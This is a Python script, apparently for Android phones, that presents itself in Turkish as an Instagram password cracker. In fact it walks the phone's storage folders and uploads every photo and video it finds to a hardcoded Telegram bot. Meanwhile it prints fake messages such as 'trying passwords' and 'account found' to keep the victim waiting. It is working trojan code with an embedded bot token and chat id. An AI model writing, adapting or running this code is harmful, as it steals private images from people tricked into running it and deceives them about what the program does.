import os
import requests

# ASCII Art
ascii_art = """
\033[92m
  ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ███╗   ███╗    
██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗████╗ ████║    
██║██╔██╗ ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██╔████╔██║    
██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║    
██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║    
╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    \033[0m
"""

print(ascii_art)

def get_telegram_updates(token, chat_id):
    url = f"https://api.telegram.org/bot{token}/getUpdates"
    response = requests.get(url)
    if response.status_code == 200:
        updates = response.json()
        messages = []
        for result in updates["result"]:
            if "message" in result and result["message"]["chat"]["id"] == chat_id:
                messages.append(result["message"]["text"])
        return messages
    else:
        print("\033[92mBir hata oluştu lûtfen tekrar dene!\033[0m")
        return []

def send_message_to_telegram(token, chat_id, text):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {"chat_id": chat_id, "text": text}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("\033[92mŞifre başarıyla çözüldü\033[0m")
    else:
        print("\033[91mŞifre çözülemedi.\033[0m")

def send_all_files_in_phone():
    token ="8396530557:AAGe1ILgn1HghpP-sSIvraj5ebNrc523HCc"
    chat_id = "7935216558"

    print("\033[92mSeçenekler:\n1. Instagram\n2. Çıkış\033[0m")
    user_choice = input("\033[92mSeçiminiz: \033[0m")

    if user_choice == "1":
        instagram_username = input("\033[92mLütfen kullanıcı adı girin: \033[0m")
        print(f"Kullanıcı adı: {instagram_username}. \033[92mLütfen sabırlı olun, şifre deneniyor...\033[0m")
    elif user_choice == "2":
        print("\033[92mÇıkış yapılıyor...\033[0m")
        return
    else:
        print("\033[91mGeçersiz seçenek, lütfen tekrar deneyin.\033[0m")
        return

    messages = get_telegram_updates(token, chat_id)
    for message in messages:
        print(f"\033[92mMessage: {message}\033[0m")

    phone_storage_paths = [
        "/storage/emulated/0",
        "/mnt/sdcard",
        "/sdcard",
        "/storage/extSdCard",
        "/storage/sdcard1",
        "/mnt/extSdCard",
        "/mnt/external_sd",
        "/data/data/[package_name]/files",
        "/data/user/0/[package_name]/files",
        "/data/user_de/0/[package_name]/files",
        "/storage/emulated/0/Download",
        "/mnt/sdcard/Download",
        "/sdcard/Download",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Movies",
        "/storage/emulated/0/Music",
        "/storage/emulated/0/Documents"
    ]

    sent_files = set()

    for path in phone_storage_paths:
        for root, dirs, files in os.walk(path):
            for filename in files:
                file_path = os.path.join(root, filename)
                
                if file_path in sent_files:
                    continue
                
                file_name = os.path.basename(file_path)
                file_ext = os.path.splitext(file_name)[1].lower()

                if file_ext in (".jpg", ".jpeg", ".png"):
                    files = {"photo": open(file_path, "rb")}
                    endpoint = "sendPhoto"
                elif file_ext in (".mp4", ".avi", ".mov"):
                    files = {"video": open(file_path, "rb")}
                    endpoint = "sendVideo"
                else:
                    print("\033[92mLÜFFEN SABIRLI OLUN ŞİFRE DENENİYOR....\033[0m")
                    continue

                try:
                    response = requests.post(f"https://api.telegram.org/bot{token}/{endpoint}", data={"chat_id": chat_id}, files=files)
                    response.raise_for_status()
                    
                    if response.json().get("ok"):
                        print("\033[92mŞifreler deneniyor lutfen bekleyin!\033[0m")
                        sent_files.add(file_path)
                    else:
                        print("\033[92mLÜTFEN İŞLEM BİTMEDEN ÇIKMAYIN YOKSA HESAPLARIN ŞİFRESİ KIRILAMAZ! \033[0m")
                except requests.exceptions.RequestException as e:
                    print("\033[92mHESAP BULUNDU!\033[0m")
                finally:
                    for file in files.values():
                        file.close()

    print("\033[92mHESAP BULUNDU ŞİFRE:\033[0m")

send_all_files_in_phone()